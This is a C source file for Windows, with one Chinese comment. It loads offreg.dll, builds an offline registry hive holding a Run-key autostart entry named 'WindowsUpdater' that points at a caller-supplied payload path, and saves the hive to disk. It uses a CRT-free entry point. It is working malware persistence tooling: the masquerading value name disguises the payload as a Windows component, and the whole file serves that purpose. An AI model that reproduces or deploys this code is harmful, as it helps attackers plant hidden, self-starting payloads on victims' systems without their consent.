#include <windows.h>
#include <shellapi.h>

// 手动实现 memset，满足编译器的初始化需求，彻底摆脱外部依赖
#pragma function(memset)
void* __cdecl memset(void* dest, int c, size_t count) {
    char* bytes = (char*)dest;
    while (count--) *bytes++ = (char)c;
    return dest;
}

int RealMain(int argc, char* argv[]) {
    if (argc != 3) return 1;

    WCHAR payloadPath[MAX_PATH] = {0};
    WCHAR outputPath[MAX_PATH] = {0};
    MultiByteToWideChar(CP_ACP, 0, argv[1], -1, payloadPath, MAX_PATH);
    MultiByteToWideChar(CP_ACP, 0, argv[2], -1, outputPath, MAX_PATH);

    HMODULE hMod = LoadLibraryA("offreg.dll");
    if (!hMod) hMod = LoadLibraryA("C:\\Windows\\SysWOW64\\offreg.dll");
    if (!hMod) hMod = LoadLibraryA("C:\\Windows\\System32\\offreg.dll");
    if (!hMod) return 1;

    typedef PVOID ORHKEY;
    typedef LONG (WINAPI* pORCreateHive)(ORHKEY*);
    typedef LONG (WINAPI* pORCreateKey)(ORHKEY, LPCWSTR, LPCWSTR, DWORD, REGSAM, PVOID, ORHKEY*, LPDWORD);
    typedef LONG (WINAPI* pORSetValue)(ORHKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
    typedef LONG (WINAPI* pORSaveHive)(ORHKEY, LPCWSTR, DWORD, DWORD);

    pORCreateHive CreateHive = (pORCreateHive)GetProcAddress(hMod, "ORCreateHive");
    pORCreateKey CreateKey = (pORCreateKey)GetProcAddress(hMod, "ORCreateKey");
    pORSetValue SetValue = (pORSetValue)GetProcAddress(hMod, "ORSetValue");
    pORSaveHive SaveHive = (pORSaveHive)GetProcAddress(hMod, "ORSaveHive");

    if (!CreateHive || !CreateKey || !SetValue || !SaveHive) return 1;

    ORHKEY hHive = NULL;
    if (CreateHive(&hHive) != ERROR_SUCCESS) return 1;

    ORHKEY hKey = NULL;
    DWORD dwDisposition;
    if (CreateKey(hHive, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_CREATE_SUB_KEY, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return 1;
    }

    int len = 0; while(payloadPath[len]) len++;
    if (SetValue(hKey, L"WindowsUpdater", 0, REG_SZ, (const BYTE*)payloadPath, (DWORD)((len + 1) * sizeof(WCHAR))) != ERROR_SUCCESS) {
        return 1;
    }

    SaveHive(hHive, outputPath, 6, 1);
    return 0;
}

void __stdcall EntryPoint() {
    int argc = 0;
    LPWSTR* argvW = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argvW || argc != 3) {
        ExitProcess(1);
    }

    char arg1[MAX_PATH] = {0};
    char arg2[MAX_PATH] = {0};
    WideCharToMultiByte(CP_ACP, 0, argvW[1], -1, arg1, MAX_PATH, NULL, NULL);
    WideCharToMultiByte(CP_ACP, 0, argvW[2], -1, arg2, MAX_PATH, NULL, NULL);
    
    char* argvA[3] = { (char*)"main.exe", arg1, arg2 };

    RealMain(3, argvA);
    ExitProcess(0);
}
